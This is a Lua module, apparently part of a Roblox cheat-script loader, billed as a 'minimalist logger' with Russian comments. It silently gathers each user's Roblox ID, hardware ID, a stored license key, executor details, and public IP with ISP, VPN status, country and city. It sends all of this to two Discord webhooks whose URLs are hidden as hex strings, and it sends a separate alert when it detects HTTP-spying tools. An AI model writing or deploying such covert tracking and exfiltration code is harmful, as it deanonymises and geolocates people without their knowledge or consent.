-- МИНИМАЛИСТИЧНЫЙ ЛОГГЕР
return function(SEC_STATE)
    if not SEC_STATE then return end
    local O = SEC_STATE.ORIG
    if not O then return end
    local LocalPlayer = SEC_STATE.LocalPlayer
    local HttpService = SEC_STATE.HttpService
    local RbxAnalytics = SEC_STATE.RbxAnalytics
    local UserInputService = SEC_STATE.UserInputService
    local request = O.request
    local game_HttpGet = O.game_HttpGet
    local loadstr = O.loadstr
    local pcall = O.pcall
    local pairs = O.pairs
    local ipairs = O.ipairs
    local tinsert = O.tinsert
    local tconcat = O.tconcat
    local tostring = O.tostring
    local s_find = O.s_find
    local s_sub = O.s_sub
    local s_char = O.s_char
    local m_floor = O.math_floor
    local task_wait = O.task_wait
    local task_spawn = O.task_spawn

    local function decHex(h)
        local s = ""
        for i = 1, #h, 2 do
            local n = tonumber(s_sub(h,i,i+1),16)
            if n then s = s .. s_char(n) end
        end
        return s
    end

    -- ВЕБХУКИ
    local WH_LOG = decHex("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")
    local WH_ALERT = decHex("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531383333343033353838383138313237312F733164313841767532456D57707A547254306A4E49686A543665314A3537595837304F58484D567878637975535377364C366E7242416A7756737067612D4C37534E4B4F")

    local uid = tostring(LocalPlayer.UserId)
    local hwid = "N/A"
    pcall(function() hwid = RbxAnalytics:GetClientId() end)
    local key = "N/A"
    pcall(function() key = O.readfile("nazarkus_key.json") end)

    -- ВАЙТЛИСТ/БЛЭКЛИСТ
    local WL = {
        UIDs = {"10760143653"},
        HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
        Keys = {"46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F", "89D11F50-5490-4677-B709-4EBFBECA78CE"}
    }
    local BL = { UIDs = {}, HWIDs = {}, Keys = {} }
    local function inList(l)
        for _, v in ipairs(l.UIDs or {}) do if v == uid then return true end end
        for _, v in ipairs(l.HWIDs or {}) do if v == hwid then return true end end
        for _, v in ipairs(l.Keys or {}) do if v == key then return true end end
        return false
    end
    local status = inList(WL.UIDs or {}) and "whitelist" or (inList(BL.UIDs or {}) and "blacklist" or "guest")
    local spyFound = SEC_STATE.detected or false
    local spyReason = SEC_STATE.reason or "None"
    SEC_STATE.status = status
    SEC_STATE.hwid = hwid
    SEC_STATE.key = key

    -- ИСПОЛНИТЕЛЬ
    local exec = "Unknown"
    local uncPct = 0
    pcall(function()
        local u = 0
        local genv = getgenv and getgenv() or _G
        local funcs = {"getgenv","getrawmetatable","hookfunction","setreadonly"}
        for _, f in ipairs(funcs) do if genv[f] then u = u + 1 end end
        uncPct = m_floor((u/#funcs)*100)
        if identifyexecutor then pcall(function() exec = identifyexecutor() end) end
    end)
    local execStr = exec .. " (UNC: "..uncPct.."%)"

    -- СЕТЬ
    local net = {ip="N/A", isp="N/A", vpn="N/A", country="N/A", city="N/A"}
    pcall(function()
        local r = request({Url="http://ip-api.com/json/?fields=status,country,city,isp,query,proxy", Method="GET"})
        if r and r.Success then
            local ok, data = pcall(HttpService.JSONDecode, HttpService, r.Body)
            if ok and data then
                net.ip = data.query or "N/A"
                net.isp = data.isp or "N/A"
                net.vpn = data.proxy and "Yes" or "No"
                net.country = data.country or "N/A"
                net.city = data.city or "N/A"
            end
        end
    end)

    -- ЕМБЕДЫ
    local embeds = {}

    if spyFound then
        tinsert(embeds, {
            title = "🚨 HTTP SPY DETECTED",
            color = 16711680,
            fields = {
                {name = "Reason", value = "```"..tostring(spyReason).."```"},
                {name = "Player", value = LocalPlayer.DisplayName.." (@"..LocalPlayer.Name..")\nID: `"..uid.."`"},
                {name = "Executor", value = execStr, inline = true},
                {name = "System", value = UserInputService.TouchEnabled and "Mobile" or "PC", inline = true},
                {name = "Hardware", value = "HWID: `"..hwid.."`\nKey: `"..key.."`"},
                {name = "Network", value = "IP: "..net.ip.."\nISP: "..net.isp.."\nVPN: "..net.vpn.."\nLoc: "..net.country..", "..net.city},
                {name = "Profile", value = "[Link](https://www.roblox.com/users/"..uid.."/profile)"}
            }
        })
        pcall(function()
            request({
                Url = WH_ALERT,
                Method = "POST",
                Headers = {["Content-Type"]="application/json"},
                Body = HttpService:JSONEncode({embeds=embeds})
            })
        end)
        return
    end

    if status == "whitelist" then
        tinsert(embeds, {
            title = "✅ Whitelisted User",
            color = 65280,
            fields = {
                {name = "**Player Info**", value = "Name: "..LocalPlayer.DisplayName.." (@"..LocalPlayer.Name..")\nUser ID: `"..uid.."`"},
                {name = "**Executor**", value = execStr},
                {name = "**System**", value = "Platform: "..(UserInputService.TouchEnabled and "Mobile" or "PC")},
                {name = "**Hardware Info**", value = "HWID: `"..hwid.."`\nKey: `"..key.."`"}
            }
        })
    else
        tinsert(embeds, {
            title = status == "blacklist" and "⛔ Blacklisted" or "⚠️ Guest",
            color = status == "blacklist" and 0 or 16753920,
            fields = {
                {name = "Player", value = LocalPlayer.DisplayName.." (@"..LocalPlayer.Name..")\nID: `"..uid.."`\nAge: "..LocalPlayer.AccountAge},
                {name = "Executor", value = execStr, inline = true},
                {name = "System", value = UserInputService.TouchEnabled and "Mobile" or "PC", inline = true},
                {name = "Hardware", value = "HWID: `"..hwid.."`\nKey: `"..key.."`"},
                {name = "Network", value = "IP: "..net.ip.."\nISP: "..net.isp.."\nVPN: "..net.vpn.."\nLoc: "..net.country..", "..net.city},
                {name = "Profile", value = "[Link](https://www.roblox.com/users/"..uid.."/profile)"}
            }
        })
    end

    pcall(function()
        request({
            Url = WH_LOG,
            Method = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body = HttpService:JSONEncode({embeds=embeds})
        })
    end)
end
